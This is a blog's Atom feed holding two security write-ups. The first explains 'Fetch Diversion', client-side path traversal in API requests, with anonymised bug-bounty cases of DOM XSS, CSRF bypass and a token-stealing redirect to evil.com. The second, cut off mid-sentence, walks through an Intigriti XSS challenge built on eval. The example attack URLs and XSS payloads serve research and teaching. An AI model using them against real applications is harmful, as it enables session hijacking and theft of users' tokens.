@@ -1,0 +1,1105 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-01-03T22:01:36+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">acut3</title><subtitle>InfoSec, CTF &amp; Bug Bounties
+</subtitle><author><name>acut3</name></author><entry><title type="html">Fetch Diversion</title><link href="http://localhost:4000/bug-bounty/2023/01/03/fetch-diversion.html" rel="alternate" type="text/html" title="Fetch Diversion" /><published>2023-01-03T00:00:00+01:00</published><updated>2023-01-03T00:00:00+01:00</updated><id>http://localhost:4000/bug-bounty/2023/01/03/fetch-diversion</id><content type="html" xml:base="http://localhost:4000/bug-bounty/2023/01/03/fetch-diversion.html"><![CDATA[<p><em>API calls and requests for resources can sometimes be diverted toward a
+different endpoint on the same host, potentially resulting in DOM XSS’s that
+would otherwise be impossible to trigger, or other types of client-side
+vulnerabilities.</em></p>
+
+<!--more-->
+
+<p><img src="/assets/fetch-diversion/cover.png" alt="Traffic sign showing &quot;Diverted traffic&quot;" /></p>
+
+<h2 id="diverting-fetch-requests">Diverting fetch requests</h2>
+
+<p>Modern web applications commonly consist of a single web page that sends
+requests to an API. Sometimes in the process, elements from the browser’s
+address bar, like query parameters or fragment parameters, are injected into
+the path segment of the API’s URL. For example, when the</p>
+
+<div class="language-escape highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://app.target.com/users?id=<span class="err">123456</span>
+</code></pre></div></div>
+
+<p>or</p>
+
+<div class="language-escape highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://app.target.com/#/users/<span class="err">123456</span>/profile
+</code></pre></div></div>
+
+<p>URL is visited, the application might send a <code class="language-plaintext highlighter-rouge">GET</code> request to</p>
+
+<div class="language-escape highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://api.target.com/v2/users/<span class="err">123456</span>/profile
+</code></pre></div></div>
+
+<p>in order to fetch the profile data of user 123456 and inject it into the DOM.</p>
+
+<p>What would happen if instead of <code class="language-plaintext highlighter-rouge">123456</code>, we used something like
+<code class="language-plaintext highlighter-rouge">../malicious/path</code> for the user id? If we’re lucky and the client-side code
+isn’t too picky about what constitutes a valid user id, we might find that the
+API call gets sent to <code class="language-plaintext highlighter-rouge">https://api.target.com/v2/malicious/path/profile</code>
+instead.</p>
+
+<p>What’s happening here is that the client-side javascript forms the
+<code class="language-plaintext highlighter-rouge">https://api.target.com/v2/users/../malicious/path/profile</code> URL and uses it in
+a fetch request. The browser then normalizes the URL before sending the
+request, which results in the <code class="language-plaintext highlighter-rouge">..</code> eating the <code class="language-plaintext highlighter-rouge">users</code> path component. Some
+other normalization that the browser does include removing unnecessary <code class="language-plaintext highlighter-rouge">/./</code>
+and converting <code class="language-plaintext highlighter-rouge">\</code> into <code class="language-plaintext highlighter-rouge">/</code>.</p>
+
+<p>Note that parameters are almost always URL-decoded at least once before being
+injected, which plays to our advantage. This is not part of URL normalization
+though; this is done by the client-side javascript, most often by the front-end
+framework. Sometimes the client-side javascript will do more processing, like
+removing <code class="language-plaintext highlighter-rouge">%0A</code> and <code class="language-plaintext highlighter-rouge">%09</code>, which can be used to bypass WAFs that might block
+<code class="language-plaintext highlighter-rouge">%2E%2E%2F</code>.</p>
+
+<p>Now we only have to get rid of the trailing <code class="language-plaintext highlighter-rouge">/profile</code> and request can be
+diverted toward any endpoint on <code class="language-plaintext highlighter-rouge">api.target.com</code>. It can usually be done by
+adding a <code class="language-plaintext highlighter-rouge">?</code> or a <code class="language-plaintext highlighter-rouge">#</code>, URL-encoded if needed, at the end of the injected
+parameter. So in the end we could could make our victim visit</p>
+
+<div class="language-escape highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://app.target.com/users?id=<span class="err">../malicious/path%23</span>
+</code></pre></div></div>
+
+<p>or</p>
+
+<div class="language-escape highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://app.target.com/#/users/<span class="err">..%2Fmalicious%2Fpath%23</span>/profile
+</code></pre></div></div>
+
+<p>and have the application make its API call to</p>
+
+<div class="language-escape highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://api.target.com/v2/users/<span class="err">../malicious/path#</span>/profile
+</code></pre></div></div>
+
+<p>which would normalize to</p>
+
+<div class="language-escape highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://api.target.com/v2/<span class="err">malicious/path</span>
+</code></pre></div></div>
+
+<p>Of course API calls are not the only type of requests we can divert.
+Applications may fetch all kinds of resources from their server, usually in the
+form of a json file. One that is particularly interesting is translation files,
+as we’ll see in our <a href="#case-1">first real-world example</a>.</p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<h3 id="dom-xss-with-uploaded-file">DOM XSS with uploaded file</h3>
+
+<p>If the application allows file uploads, and if the uploaded file can be
+retrieved on a endpoint that can be reached with a Fetch Diversion, then we can
+control the response to any request we are able to divert. It can result in an
+XSS if a property from the response is inserted into the DOM in an insecure
+way.</p>
+
+<p>The great thing with this technique is that the <code class="language-plaintext highlighter-rouge">Content-Type</code> used to serve
+the uploaded file doesn’t matter. Normally an uploaded file that is returned as
+<code class="language-plaintext highlighter-rouge">image/png</code> or <code class="language-plaintext highlighter-rouge">application/octet-stream</code>, for example, cannot be used directly
+for XSS, because browsers will only allow script execution from <a href="https://github.com/BlackFan/content-type-research/blob/master/XSS.md" target="_blank">a few select
+types</a>
+like <code class="language-plaintext highlighter-rouge">text/html</code>, <code class="language-plaintext highlighter-rouge">image/svg+xml</code> or <code class="language-plaintext highlighter-rouge">text/xml</code>. However, since the application
+is making a simple fetch, it will happily treat the response as whatever it
+expects (usually <code class="language-plaintext highlighter-rouge">application/json</code>), irrespective of its stated
+<code class="language-plaintext highlighter-rouge">Content-Type</code>.</p>
+
+<p>Similarly, response headers like <code class="language-plaintext highlighter-rouge">Content-Disposition: attachment</code>, won’t
+prevent our forged response from being interpreted.</p>
+
+<p>Unfortunately, even when we’re able to divert calls and upload files, there are
+a few additional requisites before it can be exploited for a DOM XSS:</p>
+
+<ol>
+  <li>
+    <p>We need to be able to upload a file with arbitrary content, which will be
+served unmodified. If the back-end checks the content of the file or tries
+to process it in any way (image transcoding for example), it probably won’t
+be exploitable.</p>
+  </li>
+  <li>
+    <p>The uploaded file must be accessible on the host toward which requests can
+be diverted. If, for example, the file is served directly from the CDN it’s
+uploaded to, we probably won’t be able to exploit it.</p>
+  </li>
+  <li>
+    <p>The uploaded file must be accessible by someone else, or else we would just
+end up with a self-XSS</p>
+  </li>
+  <li>
+    <p>There need to be a DOM XSS using one of the attributes returned by one of
+the requests we can divert</p>
+  </li>
+</ol>
+
+<p>A common place for exploitation is in profile pictures, which also often have
+the advantage of being publicly accessible. Our <a href="#case-2">second real-world
+example</a> is an illustration of this.</p>
+
+<h3 id="making-authenticated-requests">Making authenticated requests</h3>
+
+<p>Applications that use a custom header (like <code class="language-plaintext highlighter-rouge">Authorization</code> or <code class="language-plaintext highlighter-rouge">X-CSRF-Token</code>)
+or require <code class="language-plaintext highlighter-rouge">Content-Type: application/json</code> are normally immune to CSRF
+(barring CORS misconfiguration). But since we’re diverting a legitimate call
+issued by the application itself, we’re gaining the ability to make calls with
+our victim’s headers.</p>
+
+<p>Keep in mind though that only the path and query parameters can be controlled.
+We will have to do with whatever method and body the diverted request happens
+to have. Most of the time it will only be <code class="language-plaintext highlighter-rouge">GET</code> requests, because it’s unlikely
+that a website will issue other types of requests on its own in response to a
+navigation event. It’s not unheard of though, as our <a href="#case-3">third real-world
+example</a> shows.</p>
+
+<p>Still, if we can find an API that can change data based on query parameters,
+then we might be able to exploit it. A great example is GraphQL, which
+sometimes allows mutations through <code class="language-plaintext highlighter-rouge">GET</code> requests. If this is the case, then we
+might be able to perform mutations as our victim by making them visit a URL
+like this:</p>
+
+<div class="language-escape highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://app.target.com/users?id=<span class="err">../../graphql%3Fquery%3D{mutation ...}</span>
+</code></pre></div></div>
+
+<p>Sometimes <code class="language-plaintext highlighter-rouge">POST</code> requests will take their parameters from the URL if those
+parameters cannot be found in the body. When this is the case and if we’re able
+to divert a <code class="language-plaintext highlighter-rouge">POST</code> request then it most likely can be exploited, since it’s
+unlikely the original endpoint and the endpoint we’re diverting to both expect
+the same parameters.</p>
+
+<h3 id="stealing-access-tokens">Stealing access tokens</h3>
+
+<p>This is a theoretical exploit that I’ve never encountered in the real world.</p>
+
+<p>Imagine the application uses a custom header for authorization (as opposed to
+cookies), and we have an open redirect (the HTTP kind) on the host towards
+which requests can be diverted. Then we would be able to send requests to our
+own server, and those requests will contain our victim’s token. For example,
+visiting the following URL:</p>
+
+<div class="language-escape highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://app.target.com/users?id=<span class="err">../../path/to/open/redirect%3Furl%3D%2F%2Fevil.com</span>
+</code></pre></div></div>
+
+<p>will send an authenticated request to:</p>
+
+<div class="language-escape highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://api.target.com/<span class="err">path/to/open/redirect?url=//evil.com</span>
+</code></pre></div></div>
+
+<p>and this request, headers included, will be redirected to <code class="language-plaintext highlighter-rouge">https://evil.com</code>.</p>
+
+<h2 id="real-world-examples">Real-world examples</h2>
+
+<p>Despite the attack having quite a few requisites, I’ve been able to
+successfully exploit it on a multiple occasions. Since they were all on private
+programs, I’ll remain somewhat vague and change all URLs that would be
+identifiable.</p>
+
+<h3 id="case-1">Case 1: XSS in translation file</h3>
+
+<p>The target was a web application for secure sharing of documents within an
+organization. Documents of all kinds could be uploaded, and one of the feature
+was sharing a preview of a document with co-workers. A preview which, in the
+case of a text file, was just the file itself. The name of the preview file was
+a randomly generated UUID.</p>
+
+<p>The application also had an integrated web editor. This web editor used
+angular-translate for i18n, and the locale could be set through the <code class="language-plaintext highlighter-rouge">locale</code>
+query parameter. The translation file was loaded from</p>
+
+<div class="language-escape highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://app.target.com/i18n/locale-<span class="err">&lt;locale&gt;</span>.json
+</code></pre></div></div>
+
+<p>where <code class="language-plaintext highlighter-rouge">&lt;locale&gt;</code> was the value of the <code class="language-plaintext highlighter-rouge">locale</code> query parameter. One
+particularity is that the locale had to start with <code class="language-plaintext highlighter-rouge">en-</code> (or any other
+supported language), or angular-translate would error out and skip loading the
+translations.</p>
+
+<p>All you had to do was upload a malicious json document that would add an XSS
+payload to the translation of the appropriate message, share it with your team,
+and make one of your team members visit:</p>
+
+<div class="language-escape highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://app.target.com/path/to/web_editor?lang=<span class="err">en-/../../path/to/preview/uuid?</span>
+</code></pre></div></div>
+
+<p>It would make the application load its messages from:</p>
+
+<div class="language-escape highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://app.target.com/i18n/locale-<span class="err">en-/../../path/to/preview/uuid?</span>.json
+</code></pre></div></div>
+
+<p>which would normalize to the malicious preview file:</p>
+
+<div class="language-escape highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://app.target.com/<span class="err">path/to/preview/uuid?</span>.json
+</code></pre></div></div>
+
+<p>While the file was being loaded, the web editor would conveniently display
+status messages using the very unsafe <code class="language-plaintext highlighter-rouge">innerHTML</code>, resulting in a DOM XSS.</p>
+
+<h3 id="case-2">Case 2: XSS in API call</h3>
+
+<p>On this web application, users were able to upload an avatar for their profile.
+Avatars were publicly accessible, even to unregistered users.</p>
+
+<p>The client-side code would only allow the upload of valid image files, mostly
+because it was using an editor to offer the user the possibility to crop their
+image before upload. You could however upload arbitrary content manually, and
+the file was made available completely unchanged. XSS with an html or svg file
+was impossible though, because all avatars were served with a <code class="language-plaintext highlighter-rouge">Content-Type:
+application/binary</code> header (which makes the browser download the file, instead
+of displaying it).</p>
+
+<p>Avatars were uploaded to an S3 bucket that was using a generic
+<code class="language-plaintext highlighter-rouge">*.s3.amazonaws.com</code> hostname, but interestingly the bucket didn’t allow any
+type of public access. Instead, avatars were made accessible through an API
+that was (presumably) proxying requests to the AWS bucket. This was perfect for
+our purpose.</p>
+
+<p>The application was using vue.js, and client-side routing was done using the
+path in the URL fragment. For example,</p>
+
+<div class="language-escape highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://app.target.com/#/projects/<span class="err">123456</span>
+</code></pre></div></div>
+
+<p>would make an API call to</p>
+
+<div class="language-escape highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://app.target.com/v2/projects/<span class="err">123456</span>
+</code></pre></div></div>
+
+<p>There were multiple routes similar to this one, where the object id could be
+used to divert API calls toward a malicious avatar file.</p>
+
+<h4 id="finding-exploitable-api-calls">Finding exploitable API calls</h4>
+
+<p>The first issue was that most of them could not be be exploited for a DOM XSS.
+When properties were inserted into the DOM, it was done in a safe way. I used
+Burp’s “Match and Replace” to inject an XSS payload in all the json values
+returned by those API calls, and finally detected a few properties that were
+inserted in an insecure way. The Match and Replace was simple but effective:</p>
+
+<ul>
+  <li>Match in response body: <code class="language-plaintext highlighter-rouge">"([^"]*)":"</code></li>
+  <li>Replace: <code class="language-plaintext highlighter-rouge">"$1":"&lt;img src onerror=\\"console.log(`XSS on \${origin} using $1`)\\"&gt;</code></li>
+</ul>
+
+<h4 id="getting-through-multiple-api-calls">Getting through multiple API calls</h4>
+
+<p>The second issue was that the only interesting URL I managed to identify was
+making multiple API calls, and the call that returned the exploitable
+properties was only the 3<sup>rd</sup> call being made. The normal flow would
+look like:</p>
+
+<ul>
+  <li>User visits <code class="language-plaintext highlighter-rouge">https://app.target.com/#/projects/123456/obj1</code>
+    <ol>
+      <li>App calls <code class="language-plaintext highlighter-rouge">https://app.target.com/v2/projects/123456</code>, receiving a <code class="language-plaintext highlighter-rouge">project</code></li>
+      <li>App calls <code class="language-plaintext highlighter-rouge">https://app.target.com/v2/projects/123456/obj2</code>, receiving an <code class="language-plaintext highlighter-rouge">obj2</code></li>
+      <li>App calls <code class="language-plaintext highlighter-rouge">https://app.target.com/v2/projects/123456/obj3</code>, receiving an <code class="language-plaintext highlighter-rouge">obj3</code><br />↳ this is the response that can be exploited for a DOM XSS</li>
+    </ol>
+  </li>
+</ul>
+
+<p>With a Fetch Diversion using the project id, the flow would now be:</p>
+
+<ul>
+  <li>User visits <code class="language-plaintext highlighter-rouge">https://app.target.com/#/projects/..%2F..%2Fuploads%2Fevil.png%23/obj1</code>
+    <ol>
+      <li>App calls <code class="language-plaintext highlighter-rouge">https://app.target.com/uploads/evil.png</code>, expecting a <code class="language-plaintext highlighter-rouge">project</code>, receiving an <code class="language-plaintext highlighter-rouge">obj3</code> ⚠</li>
+      <li>App calls <code class="language-plaintext highlighter-rouge">https://app.target.com/uploads/evil.png</code>, expecting an <code class="language-plaintext highlighter-rouge">obj2</code>, receiving an <code class="language-plaintext highlighter-rouge">obj3</code> ⚠</li>
+      <li>App calls <code class="language-plaintext highlighter-rouge">https://app.target.com/uploads/evil.png</code>, expecting an <code class="language-plaintext highlighter-rouge">obj3</code>, receiving an <code class="language-plaintext highlighter-rouge">obj3</code></li>
+    </ol>
+  </li>
+</ul>
+
+<p>And the flow would in fact stop with an error on the 1<sup>st</sup> API call,
+because the expected properties were missing from the response.</p>
+
+<p>This is a fundamental limitation of Fetch Diversion: all requests that are
+diverted using the same parameter, are diverted toward the same endpoint. They
+will all see the same response, but they are are expecting different objects.
+The application may error out before even sending the request that could be
+exploited for XSS.</p>
+
+<p>In this case, I was able to work around this issue by adding the properties
+expected by the 1<sup>st</sup> API call, to the json object I was storing in my
+avatar as the intended response to the 3<sup>rd</sup> API call. That was
+enought to keep the application happy.</p>
+
+<p>I won’t get into the details of the 2<sup>nd</sup> API call, but I was
+<em>extremely</em> lucky. There was another Path Diversion that was possible there,
+and I was able to divert this call toward a 2<sup>nd</sup> avatar that would
+contain a suitable response.</p>
+
+<p>With all this, the app proceeded with the 3<sup>rd</sup> call and I was able to
+trigger a DOM XSS that could target any user, in any organization.</p>
+
+<h3 id="case-3">Case 3: Diverting a POST request to bypass CSRF protection</h3>
+
+<p>This web application was using a cookie with <code class="language-plaintext highlighter-rouge">SameSite=None</code> for authorization.
+CSRF was out of the question though, because all API calls were protected
+through the use of a custom header.</p>
+
+<p>One of the pages was using some custom code that was extracting the <code class="language-plaintext highlighter-rouge">id</code> query
+parameter from the URL, checking that it looked like a UUID, and then injecting
+it inside the path of an API call. But all values that <em>started</em> like a UUID
+were accepted.  As a result, visiting a URL such as:</p>
+
+<div class="language-escape highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://app.target.com/vulnerable/page?id=<span class="err">xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx/../../../target?</span>
+</code></pre></div></div>
+
+<p>would send a <code class="language-plaintext highlighter-rouge">POST</code> request to:</p>
+
+<div class="language-escape highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://app.target.com/api/endpoint/<span class="err">xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx/../../../target?</span>some/action
+</code></pre></div></div>
+
+<p>which would be normalized as:</p>
+
+<div class="language-escape highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://app.target.com/<span class="err">target?</span>some/action
+</code></pre></div></div>
+
+<p>Being generated by the application, the request of course contained the user’s
+anti-CSRF header (in addition to their authorization cookie).</p>
+
+<p>There were a few actions that were possible through a POST request, that didn’t
+care what the body was. The attack was able to trigger those actions as the
+victim, but none of them were extremely impactful.</p>
+
+<p>There was a <em>very</em> fortunate (for the program) and probably unintentional
+behavior in the piece of code that extracted the <code class="language-plaintext highlighter-rouge">id</code> from the URL, that made
+it impossible to add query parameters to the diverted POST request. It turned
+out to be <em>very</em> unfortunate for me, because the API had an endpoint that
+allowed the user to upload an sftp key with a POST request. This particular
+post request was taking its parameters (including the base64-encoded key to
+upload) from the query parameters when they were not present in the body. Were
+it not for this parsing peculiarity, an unauthenticated attacker would have
+been able to use the Fetch Diversion to upload their sftp key and gain
+read/write/create/delete access to the victim’s files.</p>
+
+<hr />]]></content><author><name>acut3</name></author><category term="bug-bounty" /><category term="bug bounty" /><category term="client-side" /><category term="fetch diversion" /><category term="xss" /><summary type="html"><![CDATA[API calls and requests for resources can sometimes be diverted toward a different endpoint on the same host, potentially resulting in DOM XSS’s that would otherwise be impossible to trigger, or other types of client-side vulnerabilities.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/fetch-diversion/cover.jpg" /><media:content medium="image" url="http://localhost:4000/assets/fetch-diversion/cover.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Intigrity December XSS Challenge</title><link href="http://localhost:4000/ctf/2020/12/13/intigriti-december-xss-challenge.html" rel="alternate" type="text/html" title="Intigrity December XSS Challenge" /><published>2020-12-13T00:00:00+01:00</published><updated>2020-12-13T00:00:00+01:00</updated><id>http://localhost:4000/ctf/2020/12/13/intigriti-december-xss-challenge</id><content type="html" xml:base="http://localhost:4000/ctf/2020/12/13/intigriti-december-xss-challenge.html"><![CDATA[<p><em>Using hashchange events to control a vulnerable page and escalate an otherwise
+mostly harmless DOM XSS</em></p>
+
+<!--more-->
+
+<p><img src="/assets/intigriti-december-xss-challenge/cover.png" alt="Cover" /></p>
+
+<h2 id="tldr">tl;dr</h2>
+
+<p>For those already familiar with the challenge who just want a quick rundown of
+the attack, I’ll just quote the summary I included in my bug report on
+Intigrity:</p>
+
+<blockquote>
+
+  <p>The <code class="language-plaintext highlighter-rouge">calc</code> function passes user input to <code class="language-plaintext highlighter-rouge">eval</code>, which allows an attacker to
+execute simple javascript expressions as long as they satisfy the filers in
+place. While a single <code class="language-plaintext highlighter-rouge">eval</code> can’t do much because of those restrictions, it
+can be used to first install an <code class="language-plaintext highlighter-rouge">onhashchange</code> handler. By iframing the page
+and changing the hash, several simple expressions can be executed one after the
+other, while preserving the context of the previous evaluations (there is no
+page reload). Ultimately it can be used to execute arbitrary javascript.</p>
+</blockquote>
+
+<h2 id="recon">Recon</h2>
+
+<p>The target at
+<a href="https://challenge-1220.intigriti.io/">https://challenge-1220.intigriti.io/</a> is
+a simple calculator.  As expected, it’s controlled by clicking the buttons.
+Doing so also injects query parameters into the current URL:</p>
+
+<p><img src="/assets/intigriti-december-xss-challenge/omnibox.png" alt="Omnibox" /></p>
+
+<p>Conversely, submitting those query parameters will result in the calculation
+being performed. This is done entirely client-side by the following piece of
+javascript:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">Intigriti's XSS challenge</span><span class="dl">"</span><span class="p">;</span>
+
+<span class="kd">const</span> <span class="nx">operators</span> <span class="o">=</span> <span class="p">[</span><span class="dl">"</span><span class="s2">+</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">-</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">/</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">*</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">=</span><span class="dl">"</span><span class="p">];</span>
+<span class="kd">function</span> <span class="nx">calc</span><span class="p">(</span><span class="nx">num1</span> <span class="o">=</span> <span class="dl">""</span><span class="p">,</span> <span class="nx">num2</span> <span class="o">=</span> <span class="dl">""</span><span class="p">,</span> <span class="nx">operator</span> <span class="o">=</span> <span class="dl">""</span><span class="p">){</span>
+  <span class="nx">operator</span> <span class="o">=</span> <span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">operator</span><span class="p">);</span>
+  <span class="kd">var</span> <span class="nx">operation</span> <span class="o">=</span> <span class="s2">`</span><span class="p">${</span><span class="nx">num1</span><span class="p">}${</span><span class="nx">operator</span><span class="p">}${</span><span class="nx">num2</span><span class="p">}</span><span class="s2">`</span><span class="p">;</span>
+  <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">operation</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">operation</span><span class="p">;</span>
+  <span class="k">if</span><span class="p">(</span><span class="nx">operators</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">operator</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
+    <span class="k">throw</span> <span class="dl">"</span><span class="s2">Invalid operator.</span><span class="dl">"</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="sr">/^</span><span class="se">[</span><span class="sr">0-9a-zA-Z-</span><span class="se">]</span><span class="sr">+$/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">num1</span><span class="p">))</span> <span class="o">||</span> <span class="o">!</span><span class="p">(</span><span class="sr">/^</span><span class="se">[</span><span class="sr">0-9a-zA-Z</span><span class="se">]</span><span class="sr">+$/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">num2</span><span class="p">))){</span>
+    <span class="k">throw</span> <span class="dl">"</span><span class="s2">No special characters.</span><span class="dl">"</span>
+  <span class="p">}</span>
+  <span class="k">if</span><span class="p">(</span><span class="nx">operation</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">20</span><span class="p">){</span>
+    <span class="k">throw</span> <span class="dl">"</span><span class="s2">Operation too long.</span><span class="dl">"</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="nb">eval</span><span class="p">(</span><span class="nx">operation</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">init</span><span class="p">(){</span>
+  <span class="k">try</span><span class="p">{</span>
+    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">result</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">calc</span><span class="p">(</span><span class="nx">getQueryVariable</span><span class="p">(</span><span class="dl">"</span><span class="s2">num1</span><span class="dl">"</span><span class="p">),</span> <span class="nx">getQueryVariable</span><span class="p">(</span><span class="dl">"</span><span class="s2">num2</span><span class="dl">"</span><span class="p">),</span> <span class="nx">getQueryVariable</span><span class="p">(</span><span class="dl">"</span><span class="s2">operator</span><span class="dl">"</span><span class="p">));</span>
+  <span class="p">}</span>
+  <span class="k">catch</span><span class="p">(</span><span class="nx">ex</span><span class="p">){</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">ex</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">getQueryVariable</span><span class="p">(</span><span class="nx">variable</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nb">window</span><span class="p">.</span><span class="nx">searchQueryString</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">?</span><span class="dl">"</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
+    <span class="kd">var</span> <span class="nx">vars</span> <span class="o">=</span> <span class="nx">searchQueryString</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">&amp;</span><span class="dl">'</span><span class="p">);</span>
+    <span class="kd">var</span> <span class="nx">value</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">vars</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">pair</span> <span class="o">=</span> <span class="nx">vars</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">=</span><span class="dl">'</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">pair</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">==</span> <span class="nx">variable</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">value</span> <span class="o">=</span> <span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">pair</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nx">value</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="cm">/*
+ The code below is calculator UI and not part of the challenge
+*/</span>
+
+<span class="cm">/* -- snip -- */</span>
+</code></pre></div></div>
+
+<p>When the page loads, the <code class="language-plaintext highlighter-rouge">init</code> function is called. It calls
+<code class="language-plaintext highlighter-rouge">getQueryVariable()</code> to extract <code class="language-plaintext highlighter-rouge">num1</code>, <code class="language-plaintext highlighter-rouge">num2</code> and <code class="language-plaintext highlighter-rouge">operator</code> from the URL, and
+then passes them to the <code class="language-plaintext highlighter-rouge">calc</code> function. This function will eventually call
+<code class="language-plaintext highlighter-rouge">eval(`${num1}${operator}${num2}`)</code> if those parameters pass the following
+sanity checks:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">operator</code> is one of <code class="language-plaintext highlighter-rouge">+</code> <code class="language-plaintext highlighter-rouge">-</code> <code class="language-plaintext highlighter-rouge">/</code> <code class="language-plaintext highlighter-rouge">*</code> <code class="language-plaintext highlighter-rouge">=</code></li>
+  <li><code class="language-plaintext highlighter-rouge">num1</code> is made only of letters, numbers and dash signs</li>
+  <li><code class="language-plaintext highlighter-rouge">num2</code> is made only of letters and numbers</li>
+  <li>Those 3 strings concatenated don’t exceed 20 characters</li>
+</ul>
+
+<h2 id="solving-the-challenge">Solving the challenge</h2>
+
+<h3 id="simple-assignments">Simple assignments</h3>
+
+<p>It’s quite clear from the code that the only way to get an XSS in through this
+<code class="language-plaintext highlighter-rouge">eval</code> in the <code class="language-plaintext highlighter-rouge">calc</code> function. Nowhere else is there anything capable of
+executing user-controlled expressions.</p>
+
+<p>With the restrictions in place it is trivial to make an assignment. The following URL for example will execute <code class="language-plaintext highlighter-rouge">myvar=name</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://challenge-1220.intigriti.io/?num1=myvar&amp;operator=%3d&amp;num2=name
+</code></pre></div></div>
+
+<p>Not very useful but this is a start, and we can verify in the console that
+<code class="language-plaintext highlighter-rouge">myvar</code> has been set:</p>
+
+<p><img src="/assets/intigriti-december-xss-challenge/myvar.png" alt="myvar" /></p>
+
+<h3 id="banned-characters">Banned characters</h3>
+
+<p>Armed with this, the idea would of course be to execute something like
+<code class="language-plaintext highlighter-rouge">location=javascript:alert(document.domain)</code>. It could be done if we were able
+to set <code class="language-plaintext highlighter-rouge">num2</code> to <code class="language-plaintext highlighter-rouge">javascript:alert(document.domain)</code>, but this would be blocked
+first because of the filtered characters, and then because it exceeds the 20
+chars limit.</p>
+
+<p>Is there any other variable that we can control, that wouldn’t be subject to
